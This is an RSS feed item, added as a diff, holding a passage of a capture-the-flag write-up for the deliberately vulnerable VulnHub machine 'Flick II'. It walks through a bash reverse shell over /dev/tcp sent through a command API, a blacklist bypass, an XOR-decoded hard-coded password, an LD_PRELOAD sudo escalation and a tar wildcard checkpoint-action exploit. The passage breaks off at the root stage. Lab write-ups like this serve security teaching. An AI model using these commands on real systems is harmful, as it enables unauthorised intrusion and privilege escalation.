@@ -1,0 +1,1221 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Flick on rastamouse.me</title>
+    <link>http://rastamouse.me/tags/flick/</link>
+    <description>Recent content in Flick on rastamouse.me</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Tue, 08 Sep 2015 00:00:00 +0000</lastBuildDate>
+    <atom:link href="http://rastamouse.me/tags/flick/index.xml" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>Flick II: The Flickening</title>
+      <link>http://rastamouse.me/writeups/2015/flick-ii/</link>
+      <pubDate>Tue, 08 Sep 2015 00:00:00 +0000</pubDate>
+      
+      <guid>http://rastamouse.me/writeups/2015/flick-ii/</guid>
+      <description>
+
+&lt;p&gt;After the success of &lt;a href=&#34;https://www.vulnhub.com/entry/flick-1,99/&#34;&gt;Flick: I&lt;/a&gt;, &lt;a href=&#34;https://twitter.com/leonjza&#34;&gt;@leonjza&lt;/a&gt; decided that VulnHub needed a fresh dose of pain and suffering.  &lt;a href=&#34;https://www.vulnhub.com/entry/flick-2,122/&#34;&gt;Flick: II&lt;/a&gt; is a vulnerable machine with a mobile twist - it requires the attacker to wrestle with a custom Android application to breach the VM.  I was more than complimentary about it on &lt;a href=&#34;https://twitter.com/_RastaMouse/status/638789930261585921&#34;&gt;Twitter&lt;/a&gt; - it&amp;rsquo;s definitely worth checking out.&lt;/p&gt;
+
+&lt;h2 id=&#34;https:97d1000c18ea8816fa1721a8cb10b128&#34;&gt;HTTPS&lt;/h2&gt;
+
+&lt;p&gt;After a bit of port scanning we find that only port 443 is open.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# curl -v -k https://192.168.56.102
+
+&amp;gt; GET / HTTP/1.1
+&amp;gt; User-Agent: curl/7.38.0
+&amp;gt; Host: 192.168.56.102
+&amp;gt; Accept: */*
+&amp;gt; 
+&amp;lt; HTTP/1.1 200 OK
+* Server nginx/1.6.3 is not blacklisted
+&amp;lt; Server: nginx/1.6.3
+&amp;lt; Content-Type: application/json
+&amp;lt; Transfer-Encoding: chunked
+&amp;lt; Connection: keep-alive
+&amp;lt; X-Powered-By: PHP/5.6.10
+&amp;lt; Cache-Control: no-cache
+&amp;lt; Date: Tue, 08 Sep 2015 17:54:20 GMT
+&amp;lt; 
+* Connection #0 to host 192.168.56.102 left intact
+[&amp;quot;Server Checker&amp;quot;]
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;My usual enumeration techniques (nikto, dirbuster etc) didn&amp;rsquo;t turn up anything except a readable &lt;code&gt;.htaccess&lt;/code&gt; file and an ammusing ping/pong.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# curl -k https://192.168.56.102/ping/
+{&amp;quot;response&amp;quot;:&amp;quot;pong&amp;quot;}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Time to have a look at the Android application.&lt;/p&gt;
+
+&lt;h2 id=&#34;apk:97d1000c18ea8816fa1721a8cb10b128&#34;&gt;APK&lt;/h2&gt;
+
+&lt;p&gt;I used the Android Studio emulator to run the application.  After creating an AVD in the Studio, I wrote the following &lt;code&gt;BAT&lt;/code&gt; files.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;# This starts the emulator with Nexus AVD
+&amp;quot;D:\Program Files\Android\sdk\tools\emulator.exe&amp;quot; -netdelay none -netspeed full -avd Nexus_5_API_23_x86
+
+# This loads the APK into the running emulator (wait for emu to fully start)
+&amp;quot;D:\Program Files\Android\sdk\platform-tools\adb.exe&amp;quot; install C:\Users\Rasta\Desktop\flick-check-dist.apk
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Once up and running, the emulator looks a little something like this.  First, enter the IP address of the VM.&lt;/p&gt;
+
+&lt;div align=&#34;center&#34;&gt;
+	&lt;figure style=&#34;background-color: #f2f0ec;&#34; &gt;
+    
+        &lt;img src=&#34;http://rastamouse.me/img/writeups/flick-2/1-set-server.jpg&#34;  /&gt;
+    
+    
+&lt;/figure&gt;
+&lt;/div&gt;
+
+&lt;p&gt;The application seems to go through some sort of handshake process, then you will be presented with possible commands to run.&lt;/p&gt;
+
+&lt;div align=&#34;center&#34;&gt;
+	&lt;figure style=&#34;background-color: #f2f0ec;&#34; &gt;
+    
+        &lt;img src=&#34;http://rastamouse.me/img/writeups/flick-2/2-ps.jpg&#34;  /&gt;
+    
+    
+&lt;/figure&gt;
+&lt;/div&gt;
+
+&lt;p&gt;I spent some time trying to proxy the traffic through Burp, in case the application wasn&amp;rsquo;t too fussy about which certificate it would accept.  But ultimately this proved a bit too fiddly to get working and I couldn&amp;rsquo;t force the emulator to honour the system proxy.  This might be an area I could investigate in the near future, but to solve the VM I decided to disassemble the &lt;code&gt;.apk&lt;/code&gt; back into its source code.&lt;/p&gt;
+
+&lt;p&gt;I used an &lt;a href=&#34;http://www.decompileandroid.com/&#34;&gt;online service&lt;/a&gt; for this - upload the &lt;code&gt;apk&lt;/code&gt; and download the disassembled ZIP file.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~/flick2/src/com/flick/flickcheck# ls -l
+total 296
+-rw-r--r-- 1 root root   598 Sep  8 17:20 BuildConfig.java
+-rw-r--r-- 1 root root   598 Sep  8 17:20 CallApi$1.java
+-rw-r--r-- 1 root root  2698 Sep  8 17:20 CallApi.java
+-rw-r--r-- 1 root root   311 Sep  8 17:20 CommandActivity$1.java
+-rw-r--r-- 1 root root   612 Sep  8 17:20 CommandActivity$CallAPI$1.java
+-rw-r--r-- 1 root root  3480 Sep  8 17:20 CommandActivity$CallAPI.java
+-rw-r--r-- 1 root root  9419 Sep  8 17:20 CommandActivity.java
+-rw-r--r-- 1 root root  2070 Sep  8 17:20 CommandActivity$SSHCommand.java
+-rw-r--r-- 1 root root   631 Sep  8 17:20 DoRegisterActivity$1.java
+-rw-r--r-- 1 root root   615 Sep  8 17:20 DoRegisterActivity$CallAPI$1.java
+-rw-r--r-- 1 root root  4033 Sep  8 17:20 DoRegisterActivity$CallAPI.java
+-rw-r--r-- 1 root root  6369 Sep  8 17:20 DoRegisterActivity.java
+-rw-r--r-- 1 root root   308 Sep  8 17:20 MainActivity$1.java
+-rw-r--r-- 1 root root   609 Sep  8 17:20 MainActivity$CallAPI$1.java
+-rw-r--r-- 1 root root  3391 Sep  8 17:20 MainActivity$CallAPI.java
+-rw-r--r-- 1 root root  5146 Sep  8 17:20 MainActivity.java
+-rw-r--r-- 1 root root  2901 Sep  8 17:20 PubKeyManager.java
+-rw-r--r-- 1 root root   836 Sep  8 17:20 R$anim.java
+-rw-r--r-- 1 root root 10526 Sep  8 17:20 R$attr.java
+-rw-r--r-- 1 root root   820 Sep  8 17:20 R$bool.java
+-rw-r--r-- 1 root root  4597 Sep  8 17:20 R$color.java
+-rw-r--r-- 1 root root  4077 Sep  8 17:20 R$dimen.java
+-rw-r--r-- 1 root root  4367 Sep  8 17:20 R$drawable.java
+-rw-r--r-- 1 root root  2199 Sep  8 17:20 ReadApiServerActivity.java
+-rw-r--r-- 1 root root   312 Sep  8 17:20 RegisterActivity$1.java
+-rw-r--r-- 1 root root   613 Sep  8 17:20 RegisterActivity$CallAPI$1.java
+-rw-r--r-- 1 root root  3750 Sep  8 17:20 RegisterActivity$CallAPI.java
+-rw-r--r-- 1 root root  6057 Sep  8 17:20 RegisterActivity.java
+-rw-r--r-- 1 root root  4741 Sep  8 17:20 R$id.java
+-rw-r--r-- 1 root root   545 Sep  8 17:20 R$integer.java
+-rw-r--r-- 1 root root 77594 Sep  8 17:20 R.java
+-rw-r--r-- 1 root root  2240 Sep  8 17:20 R$layout.java
+-rw-r--r-- 1 root root   623 Sep  8 17:20 R$menu.java
+-rw-r--r-- 1 root root   392 Sep  8 17:20 R$mipmap.java
+-rw-r--r-- 1 root root  2078 Sep  8 17:20 R$string.java
+-rw-r--r-- 1 root root 20104 Sep  8 17:20 R$styleable.java
+-rw-r--r-- 1 root root 20526 Sep  8 17:20 R$style.java
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;There is a lot of content to go through, I used &lt;code&gt;grep&lt;/code&gt; to find strings that I thought would be interesting.  Ultimately, I was able to work out how the application worked, which I have summerised in the following diagram.&lt;/p&gt;
+
+&lt;div align=&#34;center&#34;&gt;
+	&lt;figure style=&#34;background-color: #f2f0ec;&#34; &gt;
+    
+        &lt;img src=&#34;http://rastamouse.me/img/writeups/flick-2/handshake.png&#34;  /&gt;
+    
+    
+&lt;/figure&gt;
+&lt;/div&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;The client submits a POST request to &lt;code&gt;/register/new&lt;/code&gt; with a UUID it wishes to register.  The apk has a rather elaborate method of generating a UUID, but I found you can specify any string.&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;The server will respond to the client with an ok message and a &amp;lsquo;token&amp;rsquo;.&lt;/p&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# curl -k https://192.168.56.102/register/new -H &#39;Content-Type: application/json&#39; -d &#39;{&amp;quot;uuid&amp;quot;:&amp;quot;rasta&amp;quot;}&#39;
+{&amp;quot;registered&amp;quot;:&amp;quot;ok&amp;quot;,&amp;quot;message&amp;quot;:&amp;quot;The requested UUID is now registered.&amp;quot;,&amp;quot;token&amp;quot;:&amp;quot;xgpzOLUyJ45ExFnfalEDESLjgb6drGj3&amp;quot;}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;The client submits a GET request to &lt;code&gt;/do/cmd/&lt;/code&gt; to specify a command to run (the command must also be &lt;code&gt;base64&lt;/code&gt; encoded).  It must also specify its &lt;code&gt;uuid&lt;/code&gt; and &lt;code&gt;token&lt;/code&gt; in the &lt;code&gt;header&lt;/code&gt;.  Note that the name of the fields also differ slightly.&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;The server will respond with the output of the specified command.&lt;/p&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# curl -k https://192.168.56.102/do/cmd/$(echo -en &#39;id&#39; | base64) -H &#39;Content-Type: application/json&#39; -H &#39;X-UUID: rasta&#39; -H &#39;X-Token: xgpzOLUyJ45ExFnfalEDESLjgb6drGj3&#39;
+{&amp;quot;status&amp;quot;:&amp;quot;ok&amp;quot;,&amp;quot;command&amp;quot;:&amp;quot;id&amp;quot;,&amp;quot;output&amp;quot;:&amp;quot;uid=998(nginx) gid=997(nginx) groups=997(nginx)\n&amp;quot;}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;We soon find that there are some blacklisted commands.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# curl -k https://192.168.56.102/do/cmd/$(echo -en &#39;ls&#39; | base64) -H &#39;Content-Type: application/json&#39; -H &#39;X-UUID: rasta&#39; -H &#39;X-Token: xgpzOLUyJ45ExFnfalEDESLjgb6drGj3&#39;
+{&amp;quot;status&amp;quot;:&amp;quot;error&amp;quot;,&amp;quot;output&amp;quot;:&amp;quot;Command &#39;ls&#39; contains a banned command.&amp;quot;}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;But it&amp;rsquo;s possible to bypass this by using full paths.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# curl -k https://192.168.56.102/do/cmd/$(echo -en &#39;/bin/ls&#39; | base64) -H &#39;Content-Type: application/json&#39; -H &#39;X-UUID: rasta&#39; -H &#39;X-Token: xgpzOLUyJ45ExFnfalEDESLjgb6drGj3&#39;
+{&amp;quot;status&amp;quot;:&amp;quot;ok&amp;quot;,&amp;quot;command&amp;quot;:&amp;quot;\/bin\/ls&amp;quot;,&amp;quot;output&amp;quot;:&amp;quot;index.php\n&amp;quot;}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Time to get that shell - a simple bash reverse shell will do the trick.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# curl -k https://192.168.56.102/do/cmd/$(echo -en &#39;/bin/bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.56.101/4444 0&amp;gt;&amp;amp;1&#39; | base64) -H &#39;Content-Type: application/json&#39; -H &#39;X-UUID: rasta&#39; -H &#39;X-Token: xgpzOLUyJ45ExFnfalEDESLjgb6drGj3&#39;
+
+root@kali:~# nc -lnvp 4444
+listening on [any] 4444 ...
+connect to [192.168.56.101] from (UNKNOWN) [192.168.56.102] 45976
+bash: no job control in this shell
+bash-4.2$ id
+uid=998(nginx) gid=997(nginx) groups=997(nginx)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;robin:97d1000c18ea8816fa1721a8cb10b128&#34;&gt;Robin&lt;/h2&gt;
+
+&lt;p&gt;The apk has an advertised capability to execute commands over SSH as well as HTTPS.  But since SSH doesn&amp;rsquo;t seem to be enabled on the VM, this doesn&amp;rsquo;t work.  However, there is functional code within the application to establish an SSH connection, but the credentials are rather obscure.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;public CommandActivity()
+    {
+        integrity_check = &amp;quot;YFhaRBMNFRQDFxJEFlFDExIDVUMGEhcLAUNFBVdWQGFeXBIVWEsZWQ==&amp;quot;;
+    }
+
+    private static String validate(String s)
+    {
+        char ac[] = new char[31];
+        char[] _tmp = ac;
+        ac[0] = &#39;T&#39;;
+        ac[1] = &#39;h&#39;;
+        ac[2] = &#39;i&#39;;
+        ac[3] = &#39;s&#39;;
+        ac[4] = &#39; &#39;;
+        ac[5] = &#39;i&#39;;
+        ac[6] = &#39;s&#39;;
+        ac[7] = &#39; &#39;;
+        ac[8] = &#39;a&#39;;
+        ac[9] = &#39; &#39;;
+        ac[10] = &#39;s&#39;;
+        ac[11] = &#39;u&#39;;
+        ac[12] = &#39;p&#39;;
+        ac[13] = &#39;e&#39;;
+        ac[14] = &#39;r&#39;;
+        ac[15] = &#39; &#39;;
+        ac[16] = &#39;s&#39;;
+        ac[17] = &#39;e&#39;;
+        ac[18] = &#39;c&#39;;
+        ac[19] = &#39;r&#39;;
+        ac[20] = &#39;e&#39;;
+        ac[21] = &#39;t&#39;;
+        ac[22] = &#39; &#39;;
+        ac[23] = &#39;m&#39;;
+        ac[24] = &#39;e&#39;;
+        ac[25] = &#39;s&#39;;
+        ac[26] = &#39;s&#39;;
+        ac[27] = &#39;a&#39;;
+        ac[28] = &#39;g&#39;;
+        ac[29] = &#39;e&#39;;
+        ac[30] = &#39;!&#39;;
+        StringBuilder stringbuilder = new StringBuilder();
+        for (int i = 0; i &amp;lt; s.length(); i++)
+        {
+            stringbuilder.append((char)(s.charAt(i) ^ ac[i % ac.length]));
+        }
+
+        return stringbuilder.toString();
+    }
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The SSH password is the result of &lt;code&gt;YFhaRBMNFRQDFxJEFlFDExIDVUMGEhcLAUNFBVdWQGFeXBIVWEsZWQ==&lt;/code&gt; XOR&amp;rsquo;d with &lt;code&gt;This is a super secret message!&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;The username is specified in friendly plaintext.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;obj = (new JSch()).getSession(&amp;quot;robin&amp;quot;, ((String) (obj)), 22);
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Some jiggery-pokery to XOR it back&amp;hellip;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/env python
+
+import sys
+
+xor1 = &amp;quot;YFhaRBMNFRQDFxJEFlFDExIDVUMGEhcLAUNFBVdWQGFeXBIVWEsZWQ==&amp;quot;.decode(&#39;base64&#39;)
+xor2 = &amp;quot;This is a super secret message!&amp;quot;
+
+for r in range(len(xor1)):
+        sys.stdout.write(chr(ord(xor1[r]) ^ ord(xor2[r % len(xor2)])))
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# ./xor.py 
+40373df4b7a1f413af61cf7fd06d03a565a51898
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Because SSH is disabled, we can&amp;rsquo;t gain access that way.  But since we have a shell, we can &lt;code&gt;su&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;bash-4.2$ su robin
+Password: 40373df4b7a1f413af61cf7fd06d03a565a51898
+
+python -c &#39;import pty; pty.spawn(&amp;quot;/bin/bash&amp;quot;)&#39;
+
+[robin@fII ~]$ id     
+uid=1000(robin) gid=1000(robin) groups=1000(robin)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;bryan:97d1000c18ea8816fa1721a8cb10b128&#34;&gt;Bryan&lt;/h2&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;[robin@fII ~]$ ls -l
+-rw-r--r-- 1 robin robin 1617 Jul 23 21:35 debug.gpg
+
+[robin@fII ~]$ cat debug.gpg
+cat debug.gpg
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA1
+
+Dude,
+
+I know you are trying to debug this stupid dice thing, so I figured the below
+will be useful?
+
+[...]
+__libc_start_main(0x555555554878, 1, 0x7fffffffe508, 0x5555555548e0 &amp;lt;unfinished ...&amp;gt;
+getenv(&amp;quot;LD_PRELOAD&amp;quot;)                                                                                          = nil
+rand()                                                                                                        = 1804289383
+__printf_chk(1, 0x555555554978, 0x6b8b4567, 0x7ffff7dd40d4)                                                   = 22
+__cxa_finalize(0x555555754e00, 0, 0, 1)                                                                       = 0x7ffff7dd6290
++++ exited (status 0) +++Dice said: 1804289383
+[...]
+
+Lemme know!
+
+- --
+Sean
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;[robin@fII ~]$ sudo -l
+[sudo] password for robin: 40373df4b7a1f413af61cf7fd06d03a565a51898
+
+Matching Defaults entries for robin on this host:
+    requiretty, !visiblepw, always_set_home, env_reset, env_keep=&amp;quot;COLORS
+    DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR LS_COLORS&amp;quot;, env_keep+=&amp;quot;MAIL PS1
+    PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE&amp;quot;, env_keep+=&amp;quot;LC_COLLATE
+    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES&amp;quot;, env_keep+=&amp;quot;LC_MONETARY
+    LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE&amp;quot;, env_keep+=&amp;quot;LC_TIME LC_ALL
+    LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY&amp;quot;, env_keep+=LD_PRELOAD,
+    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin
+
+User robin may run the following commands on this host:
+    (bryan) /usr/local/bin/dice
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;So we have some debugging information and the ability to run &lt;code&gt;dice&lt;/code&gt; as bryan.  Running the binary outputs a random number (undoubtedly from the rand() function).&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;[robin@fII ~]$ /usr/local/bin/dice
+Dice said: 1804289383
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;We can also make the following observations:  &lt;code&gt;getenv(&amp;quot;LD_PRELOAD&amp;quot;)&lt;/code&gt; in the trace and &lt;code&gt;env_keep+=LD_PRELOAD&lt;/code&gt; enabled in sudo.  This looks like we could pull off an &lt;code&gt;LD_PRELOAD&lt;/code&gt; trick - by writing our own shared library to replace the rand() call.  Stub out the &lt;code&gt;getenv&lt;/code&gt; function in the binary, then specify our own when running sudo.&lt;/p&gt;
+
+&lt;p&gt;We can test this by forcing dice to return a fixed value, rather than a random one.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;char *getenv(const char *name){
+	return 0;
+}
+
+int rand(){
+	return 4444;
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;[robin@fII ~]$ gcc -fPIC -shared rand.c -o /tmp/rand.so
+
+[robin@fII ~]$ sudo -u bryan LD_PRELOAD=/tmp/rand.so /usr/local/bin/dice
+[sudo] password for robin: 40373df4b7a1f413af61cf7fd06d03a565a51898
+
+Dice said: 4444
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Replace 4444 with something more useful&amp;hellip;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;int rand(){
+        system(&amp;quot;/bin/bash&amp;quot;);
+        return 0;
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;[robin@fII ~]$ sudo -u bryan LD_PRELOAD=/tmp/rand.so /usr/local/bin/dice
+[bryan@fII robin]$ id
+uid=1001(bryan) gid=1001(bryan) groups=1001(bryan)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;sean:97d1000c18ea8816fa1721a8cb10b128&#34;&gt;Sean&lt;/h2&gt;
+
+&lt;p&gt;&lt;code&gt;/usr/local/bin/&lt;/code&gt; actually contains 4 binaries.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;-rwsr-x---. 1 sean bryan    8830 Jul  2 18:56 backup
+-rwxr-xr-x. 1 root root  1107672 Jun 22 10:20 composer
+-rwx--x--x. 1 root root     8830 Jul  2 17:28 dice
+-rwsr-x---  1 root sean   866169 Aug 15 11:53 restore
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;These look like they will serve as our path from robin &amp;gt; sean &amp;gt; root.  &lt;code&gt;backup&lt;/code&gt; is owned by &lt;code&gt;sean&lt;/code&gt; and has &lt;code&gt;suid&lt;/code&gt; set.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;[bryan@fII ~]$ /usr/local/bin/backup
+ * Securing environment
+ * Performing database backup...
+app/
+app/.gitignore
+database.sqlite
+framework/
+framework/cache/
+framework/cache/.gitignore
+framework/sessions/
+framework/sessions/.gitignore
+framework/views/
+framework/views/.gitignore
+logs/
+logs/.gitignore
+logs/lumen.log
+ * Backup done!
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I transfered this to my kali box for closer inspection.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# file backup
+backup: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=47b4cbc324a3676428e493fddbbe5d22d3e2f55d, not stripped
+
+root@kali:~# gdb -q backup
+gdb-peda$ checksec 
+CANARY    : disabled
+FORTIFY   : disabled
+NX        : ENABLED
+PIE       : ENABLED
+RELRO     : Partial
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;gdb-peda$ info functions 
+All defined functions:
+
+Non-debugging symbols:
+0x00000000000006a0  _init
+0x00000000000006d0  puts@plt
+0x00000000000006e0  setresuid@plt
+0x00000000000006f0  setresgid@plt
+0x0000000000000700  system@plt
+0x0000000000000710  __libc_start_main@plt
+0x0000000000000720  __gmon_start__@plt
+0x0000000000000730  __cxa_finalize@plt
+0x0000000000000740  _start
+0x0000000000000770  deregister_tm_clones
+0x00000000000007a0  register_tm_clones
+0x00000000000007e0  __do_global_dtors_aux
+0x0000000000000820  frame_dummy
+0x0000000000000858  main
+0x00000000000008d0  __libc_csu_init
+0x0000000000000940  __libc_csu_fini
+0x0000000000000944  _fini
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;gdb-peda$ pdisass main
+Dump of assembler code for function main:
+   0x0000000000000858 &amp;lt;+0&amp;gt;:	sub    rsp,0x8
+   0x000000000000085c &amp;lt;+4&amp;gt;:	mov    edx,0x3ea
+   0x0000000000000861 &amp;lt;+9&amp;gt;:	mov    esi,0x3ea
+   0x0000000000000866 &amp;lt;+14&amp;gt;:	mov    edi,0x3ea
+   0x000000000000086b &amp;lt;+19&amp;gt;:	mov    eax,0x0
+   0x0000000000000870 &amp;lt;+24&amp;gt;:	call   0x6e0 &amp;lt;setresuid@plt&amp;gt;
+   0x0000000000000875 &amp;lt;+29&amp;gt;:	mov    edx,0x3ea
+   0x000000000000087a &amp;lt;+34&amp;gt;:	mov    esi,0x3ea
+   0x000000000000087f &amp;lt;+39&amp;gt;:	mov    edi,0x3ea
+   0x0000000000000884 &amp;lt;+44&amp;gt;:	mov    eax,0x0
+   0x0000000000000889 &amp;lt;+49&amp;gt;:	call   0x6f0 &amp;lt;setresgid@plt&amp;gt;
+   0x000000000000088e &amp;lt;+54&amp;gt;:	lea    rdi,[rip+0xbf]        # 0x954
+   0x0000000000000895 &amp;lt;+61&amp;gt;:	call   0x6d0 &amp;lt;puts@plt&amp;gt;
+   0x000000000000089a &amp;lt;+66&amp;gt;:	lea    rdi,[rip+0xdf]        # 0x980
+   0x00000000000008a1 &amp;lt;+73&amp;gt;:	call   0x6d0 &amp;lt;puts@plt&amp;gt;
+   0x00000000000008a6 &amp;lt;+78&amp;gt;:	lea    rdi,[rip+0xfb]        # 0x9a8
+   0x00000000000008ad &amp;lt;+85&amp;gt;:	mov    eax,0x0
+   0x00000000000008b2 &amp;lt;+90&amp;gt;:	call   0x700 &amp;lt;system@plt&amp;gt;
+   0x00000000000008b7 &amp;lt;+95&amp;gt;:	lea    rdi,[rip+0xae]        # 0x96c
+   0x00000000000008be &amp;lt;+102&amp;gt;:	call   0x6d0 &amp;lt;puts@plt&amp;gt;
+   0x00000000000008c3 &amp;lt;+107&amp;gt;:	add    rsp,0x8
+   0x00000000000008c7 &amp;lt;+111&amp;gt;:	ret  
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Some interesting functions - a &lt;code&gt;setresuid&lt;/code&gt;, &lt;code&gt;setresgid&lt;/code&gt; and &lt;code&gt;system&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;setresuid (ruid=0x3ea, euid=0x3ea, suid=0x3ea)
+setresgid (rgid=0x3ea, egid=0x3ea, sgid=0x3ea)
+system (line=0x7f8d5f3309a8 &amp;quot;PATH=/usr/local/bin:/bin:/usr/bin:/usr/local/sbin:/usr/sbin; cd /usr/share/nginx/serverchecker/storage; /bin/tar -zvcf /home/sean/backup_$(/bin/date +\&amp;quot;%Y%m%d\&amp;quot;).tar.gz *;&amp;quot;)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The tell-tale woot woot in this, is the command being passed into system.  There is a wildcard: &lt;code&gt;.tar.gz *&lt;/code&gt; which is vulnerable to a &lt;a href=&#34;https://www.exploit-db.com/papers/33930/&#34;&gt;pretty well documented&lt;/a&gt; Tar arbitrary command execution.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;[bryan@fII bin]$ cd /usr/share/nginx/serverchecker/storage
+[bryan@fII storage]$ &amp;gt;&#39;--checkpoint=1&#39;
+[bryan@fII storage]$ &amp;gt;&#39;--checkpoint-action=exec=sh shell.sh&#39;
+[bryan@fII storage]$ echo &#39;/bin/bash&#39; &amp;gt; shell.sh
+
+[bryan@fII storage]$ ls -l
+
+drwxr-xr-x. 2 nginx nginx   23 Jun 22 10:43 app
+-rw-rw-r--  1 bryan bryan    0 Sep  8 22:13 --checkpoint=1
+-rw-rw-r--  1 bryan bryan    0 Sep  8 22:13 --checkpoint-action=exec=sh shell.sh
+-rwxrwxrwx. 1 nginx nginx 6144 Sep  8 20:35 database.sqlite
+drwxr-xr-x. 5 nginx nginx   45 Jun 22 10:43 framework
+drwxr-xr-x. 2 nginx nginx   39 Jun 22 17:16 logs
+-rw-rw-r--  1 bryan bryan   10 Sep  8 22:14 shell.sh
+
+[bryan@fII storage]$ /usr/local/bin/backup
+/usr/local/bin/backup
+ * Securing environment
+ * Performing database backup...
+app/
+app/.gitignore
+database.sqlite
+framework/
+framework/cache/
+framework/cache/.gitignore
+sh-4.2$ id; whoami
+uid=1002(sean) gid=1001(bryan) groups=1002(sean),1001(bryan)
+sean
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;root:97d1000c18ea8816fa1721a8cb10b128&#34;&gt;Root&lt;/h2&gt;
+
+&lt;p&gt;Up next is &lt;code&gt;-rwsr-x---  1 root sean   866169 Aug 15 11:53 restore&lt;/code&gt;.  Trying to run it as we are results in a fail.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;sh-4.2$ ./restore
+sh: ./restore: Permission denied
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;We have to set our group properly with &lt;code&gt;newgrp sean&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;bash-4.2$ newgrp sean;
+bash: /home/bryan/.bashrc: Permission denied
+&lt;/code&gt;&lt;/pre&gt;
+
